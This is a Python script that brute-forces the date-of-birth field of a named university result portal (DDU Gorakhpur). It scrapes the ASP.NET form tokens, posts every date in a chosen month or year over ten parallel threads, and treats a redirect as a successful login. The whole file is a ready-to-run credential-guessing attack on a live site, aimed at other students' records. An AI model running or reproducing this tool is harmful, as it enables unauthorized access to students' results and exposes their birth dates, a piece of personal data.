import requests
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed
import re

def extract_form_values(html):
    """Extract VIEWSTATE, EVENTVALIDATION, VIEWSTATEGENERATOR from page"""
    viewstate = re.search(r'id="__VIEWSTATE" value="([^"]+)"', html)
    eventvalidation = re.search(r'id="__EVENTVALIDATION" value="([^"]+)"', html)
    viewstategenerator = re.search(r'id="__VIEWSTATEGENERATOR" value="([^"]+)"', html)
    if not all([viewstate, eventvalidation, viewstategenerator]):
        return None
    return {
        "__VIEWSTATE": viewstate.group(1),
        "__EVENTVALIDATION": eventvalidation.group(1),
        "__VIEWSTATEGENERATOR": viewstategenerator.group(1)
    }

def try_date(session, roll_no, semester, date_of_birth, form_values):
    """Try a specific date and check if it redirects (successful login)"""
    url = "https://ddugorakhpur.com/result2023/searchresult_new.aspx"
    
    form_data = {
        **form_values,
        "ddlsem": semester,
        "txtRollno": roll_no,
        "txtDob": date_of_birth,
        "btnSearch": "Search Result"
    }

    try:
        response = session.post(url, data=form_data, allow_redirects=False, timeout=5)
        if response.status_code == 302:
            print(f"✅ Found: {date_of_birth}")
            return True
    except Exception as e:
        print(f"Error trying {date_of_birth}: {e}")
    
    return False

def generate_dates(year, month=None):
    """Generate all dates in a year or specific month"""
    dates = []
    if month:
        start_date = datetime(year, month, 1)
        if month == 12:
            end_date = datetime(year + 1, 1, 1) - timedelta(days=1)
        else:
            end_date = datetime(year, month + 1, 1) - timedelta(days=1)
    else:
        start_date = datetime(year, 1, 1)
        end_date = datetime(year, 12, 31)

    current_date = start_date
    while current_date <= end_date:
        dates.append(current_date.strftime('%Y-%m-%d'))
        current_date += timedelta(days=1)
    return dates

def find_dob(roll_no, semester, dates):
    """Main logic to try multiple dates in parallel"""
    url = "https://ddugorakhpur.com/result2023/searchresult_new.aspx"
    session = requests.Session()

    # Get form values once
    resp = session.get(url)
    form_values = extract_form_values(resp.text)
    if not form_values:
        print("Failed to extract form values.")
        return None

    found_date = None

    def worker(date_of_birth):
        nonlocal found_date
        if not found_date:  # Stop if already found
            success = try_date(session, roll_no, semester, date_of_birth, form_values)
            if success:
                found_date = date_of_birth
        return

    # Using ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=10) as executor:  # 20 threads
        futures = [executor.submit(worker, date) for date in dates]
        for future in as_completed(futures):
            if found_date:
                break  # Stop early if found

    return found_date

def main():
    print("DDU Result Portal DOB Finder (Fast Version)")
    print("--------------------------------------------")

    roll_no = input("Enter Roll Number: ")
    semester = input("Enter Semester (1-8): ")

    print("\nOptions:")
    print("1. Try specific date")
    print("2. Try all days in a specific month")
    print("3. Try all days in a specific year")

    choice = input("Enter your choice (1-3): ")

    if choice == "1":
        date_str = input("Enter date (YYYY-MM-DD): ")
        result = find_dob(roll_no, semester, [date_str])
        if result:
            print(f"✅ Found matching DOB: {result}")
        else:
            print("❌ No match found for the given date.")

    elif choice == "2":
        year = int(input("Enter year (YYYY): "))
        month = int(input("Enter month (1-12): "))
        dates = generate_dates(year, month)
        result = find_dob(roll_no, semester, dates)
        if result:
            print(f"✅ Found matching DOB: {result}")
        else:
            print("❌ No matching DOB found in the specified month.")

    elif choice == "3":
        year = int(input("Enter year (YYYY): "))
        dates = generate_dates(year)
        result = find_dob(roll_no, semester, dates)
        if result:
            print(f"✅ Found matching DOB: {result}")
        else:
            print("❌ No matching DOB found in the specified year.")

    else:
        print("Invalid choice.")

if __name__ == "__main__":
    main()
